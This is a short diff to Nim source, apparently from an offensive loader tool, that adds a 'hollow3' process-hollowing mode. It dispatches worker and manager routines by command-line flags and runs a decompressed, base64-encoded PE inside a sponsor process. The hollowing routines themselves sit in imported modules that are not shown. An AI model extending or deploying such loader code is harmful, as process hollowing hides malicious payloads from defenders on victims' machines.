@@ -13,6 +13,8 @@ when defined(hollow1):
     import hollow1
 when defined(hollow2):
     import hollow2
+when defined(hollow3):
+    import hollow3
 when defined(hollow4):
     import hollow4
 
@@ -27,12 +29,15 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
     var peStr = uncompress(compressedPe)
 
     # Check hollowsplitted args 
-    when defined(hollow4):
+    when defined(hollow3) or defined(hollow4):
         let commandLineParams = commandLineParams()
         for i in commandLineParams:
             if i.startsWith("-A:") or i.startsWith("-W:") or i.startsWith("-T:") or i.startsWith("-R:"):
                 # This is a worker process in splitted hollow, let it go
-                return hollow4Worker(peStr)
+                when defined(hollow3):
+                    return hollow3Worker(peStr)
+                when defined(hollow4):
+                    return hollow4Worker(peStr)
         if not ("-M" in commandLineParams):
             quit(1)
 
@@ -47,6 +52,8 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
         return hollow1(peStr, ppi)
     when defined(hollow2):
         return hollow2(peStr, ppi)
+    when defined(hollow3):
+        return hollow3Manager(peStr, ppi)
     when defined(hollow4):
         return hollow4Manager(peStr, ppi)
 
